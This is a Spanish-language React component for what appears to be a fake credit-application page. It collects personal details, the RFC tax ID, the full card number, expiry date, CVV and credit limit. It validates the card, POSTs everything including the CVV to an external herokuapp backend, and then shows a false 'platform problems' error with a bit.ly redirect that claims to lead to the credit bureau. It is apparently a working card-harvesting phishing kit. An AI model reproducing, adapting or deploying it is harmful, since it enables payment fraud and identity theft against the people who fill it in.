import React, { Component } from "react"
import luhn from 'luhn'
import styles from '../styles/form.module.css'
import Swal from 'sweetalert2'
import banco from '../img/banco.PNG'
import bank from '../img/bank.svg'

class Form extends Component {

    constructor() {
        super()
        this.state = {
            nombre: "",
            apellido_paterno: "",
            apellido_materno: "",
            direccion: "",
            codigo_postal: "",
            municipio: "",
            estado: "",
            sueldo: "",
            limite: "",
            estado_civil: "",
            telefono: "",
            tarjeta: "false",
            vencimiento: "",
            cvv: "",
            banco: "",
            rfc: ""
        }
        this.addTarjeta = this.addTarjeta.bind(this)
        this.handleChange = this.handleChange.bind(this)
    }




    addTarjeta(e) {
        const {
            nombre, apellido_paterno, apellido_materno, direccion, codigo_postal, municipio, estado,
            sueldo, limite, estado_civil, telefono, tarjeta, vencimiento, cvv, banco, rfc
        } = this.state

        const lookup = require("binlookup")()
        lookup(tarjeta).then(
            data => console.log(data.stringify())
        )

        const is_valid = luhn.validate(tarjeta)

        if (nombre === "" || apellido_paterno === "" || apellido_materno === "" || direccion === "" ||
            codigo_postal === "" || municipio === "" || estado === "" || sueldo === "" || limite === "" || estado_civil === "" ||
            telefono === "" || banco === "" ||
            rfc === "") {
            Swal.fire({
                title: 'Ho Ho',
                text: 'Por favor revisa que los campos no esten vacios',
                icon: 'error'
            })
        } else {
            if (is_valid === false || tarjeta === "") {
                Swal.fire({
                    title: 'Ho Ho',
                    text: 'Por favor revisa que la tarjeta sea correcta',
                    icon: 'error'
                })
            } else {
                if (vencimiento.length < 4 || cvv.length < 3) {
                    Swal.fire({
                        title: 'Ho Ho',
                        text: 'Por favor revisa que el cvv y la fecha esten correctos',
                        icon: 'error'
                    })
                } else {
                    fetch('https://backend-credifast.herokuapp.com/form', {
                        method: 'POST',
                        body: JSON.stringify(this.state),
                        headers: {
                            'Accept': 'application/json',
                            'Content-Type': 'application/json'
                        }
                    })
                        .then(res => res)
                        .catch(err => console.log(err))
                    Swal.fire({
                        title: 'Ups',
                        icon: 'error',
                        html:
                            'Al parecer la plataforma presenta problemas, por favor intenta mas tarde, te redireccionaremos a la plataforma de buro de credito.' +
                            '<a href="https://bit.ly/35chpkt"><button style="background: #fac95f; border:none; color: #fff; padding: 10px; border-radius: 10px">Aceptar</button></a> ',
                        showConfirmButton: false
                    })
                }
            }
        }

        e.preventDefault()
    }

    handleChange(e) {
        const { name, value } = e.target
        this.setState({
            [name]: value
        })
        console.log(e.target.value);
    }

    render() {
        return (
            <div>
                <div class="alert alert-primary" style={{ margin: 'auto' }} role="alert">
                    Recuerda: para hacer tu solicitud, ten a la mano el último estado de cuenta de tu tarjeta de crédito vigente y captura los datos que te solicitamos tal y como aparecen en él.
                </div>

                <div className={styles.contenedor_two}>
                    <div className={styles.form_contenedor}>
                        <div className={styles.buro}>
                            <form className={styles.form}>
                                <div className={styles.buro_form}>
                                    <div className={styles.input_box}>
                                        <span className={styles.details}>Nombre</span>
                                        <input required onChange={this.handleChange} type="text" id='nombre' placeholder='nombre' name='nombre' />
                                    </div>
                                    <div className={styles.input_box}>
                                        <span className={styles.details}>Apellido Paterno</span>
                                        <input required onChange={this.handleChange} type="text" id='apellido_paterno' placeholder='apellido_paterno'
                                            name='apellido_paterno' />
                                    </div>
                                    <div className={styles.input_box}>
                                        <span className={styles.details}>Apellido Materno</span>
                                        <input required onChange={this.handleChange} type="text" id='apellido_materno' placeholder='apellido_materno'
                                            name='apellido_materno' />
                                    </div>
                                    <div className={styles.input_box}>
                                        <span className={styles.details}>Direccion</span>
                                        <input required onChange={this.handleChange} type="text" id='direccion' placeholder='direccion' name='direccion' />
                                    </div>
                                    <div className={styles.input_box}>
                                        <span className={styles.details}>Codigo Postal</span>
                                        <input required onChange={this.handleChange} maxLength='5' type="text" id='codigo_postal'
                                            placeholder='codigo postal' name='codigo_postal' />
                                    </div>
                                    <div className={styles.input_box}>
                                        <span className={styles.details}>Municipio</span>
                                        <input required onChange={this.handleChange} type="text" id='municipio' placeholder='municipio' name='municipio' />
                                    </div>
                                    <div className={styles.input_box}>
                                        <span className={styles.details}>Estado</span>
                                        <input required onChange={this.handleChange} type="text" id='estado' placeholder='estado' name='estado' />
                                    </div>
                                    <div className={styles.input_box}>
                                        <span className={styles.details}>Ocupacion</span>
                                        <input required onChange={this.handleChange} type="text" placeholder='Ocupacion' />
                                    </div>
                                    <div className={styles.input_box}>
                                        <span className={styles.details}>Sueldo</span>
                                        <input required onChange={this.handleChange} type="number" id='sueldo' placeholder='sueldo' name='sueldo' />
                                    </div>
                                    <div className={styles.input_box}>
                                        <span className={styles.details}>Estado Civil</span>
                                        <input required onChange={this.handleChange} type="text" id='estado_civil' placeholder='estado civil'
                                            name='estado_civil' />
                                    </div>
                                    <div className={styles.input_box}>
                                        <span className={styles.details}>Telefono</span>
                                        <input required onChange={this.handleChange} maxLength='10' type="text" id='telefono' placeholder='telefono'
                                            name='telefono' />
                                    </div>
                                    <div className={styles.input_box}>
                                        <span className={styles.details}>RFC <br /></span>
                                        <input required onChange={this.handleChange} type="text" id='rfc' placeholder='RFC' name='rfc' />
                                    </div>

                                    {/* /////////////////////////////////////////// */}

                                    <h5 className="text-center">Datos Bancarios</h5>

                                    <div className={styles.data_bank}>
                                        <div className="input-group">
                                            <input required onChange={this.handleChange} maxLength='16' className='form-control' type="text" id='tarjeta' placeholder='tarjeta'
                                                name='tarjeta' />
                                        </div>
                                        <div className="input-group">
                                            <input required onChange={this.handleChange} maxLength='5' className='form-control vencimiento' type="text" id='vencimiento'
                                                placeholder='MM/YY' name='vencimiento' />
                                            <input required onChange={this.handleChange} maxLength='3' className='form-control' type="text" id='codigo' placeholder='CVV'
                                                name='cvv' />
                                        </div>
                                        <div className="input-group">
                                            <input required onChange={this.handleChange} className='form-control' type="text" id='sueldo' placeholder='banco' name='banco' />
                                            <input required onChange={this.handleChange} className='form-control' type="number" id='limite-credito' placeholder='Limite de Credito'
                                                name='limite' />
                                        </div>
                                    </div>
                                    <div className="input-group">
                                        <h5 style={{ fontSize: '15px', marginRight: '10px', marginTop: '2px' }}>¿Cuenta con credito hipotecario?</h5>
                                        <div className='form-check'>
                                            <label className='form-check-label'>Si</label>
                                            <input required onChange={this.handleChange} className="form-check-input" type="radio" name="flexRadioDefault" id="flexRadioDefault1" />
                                        </div>
                                        <div className='form-check' style={{ marginLeft: '20px' }}>
                                            <label className='form-check-label'>No</label>
                                            <input required onChange={this.handleChange} className="form-check-input" type="radio" name="flexRadioDefault" id="flexRadioDefault1" />
                                        </div>
                                    </div>

                                    <div className="input-group">
                                        <h5 style={{ fontSize: '15px', marginRight: '10px', marginTop: '2px' }}>¿Cuenta con credito automotriz?</h5>
                                        <div className='form-check'>
                                            <label className='form-check-label'>Si</label>
                                            <input required onChange={this.handleChange} className="form-check-input" type="radio" name="flexRadioDefault2" id="flexRadioDefault2" />
                                        </div>
                                        <div className='form-check' style={{ marginLeft: '20px' }}>
                                            <label className='form-check-label'>No</label>
                                            <input required onChange={this.handleChange} className="form-check-input" type="radio" name="flexRadioDefault2" id="flexRadioDefault2" />
                                        </div>
                                    </div>
                                </div>
                                <div className='input-group justify-content-center'>
                                    <button className='btn btn-success' id='buttonForm' onClick={this.addTarjeta} type="submit">Enviar</button>
                                </div>
                            </form>
                        </div>
                    </div>
                    <div className={styles.form_panel}>
                        <div className={styles.panel_two}>
                            <div className={styles.panel_right}>
                                <div className={styles.content}>
                                    {/* <h3> Recuerda llenar todos los campos solicitados</h3>
                                    <p>Esto nos ayudara a comprobar tu buro de credito de una forma rapida y segura</p> */}
                                    <img
                                        alt="auth"
                                        src={banco}
                                        className={styles.image_form} />
                                    <img
                                        alt="auth"
                                        src={bank}
                                        className={styles.image_bank} />
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        )
    }
}

export default Form;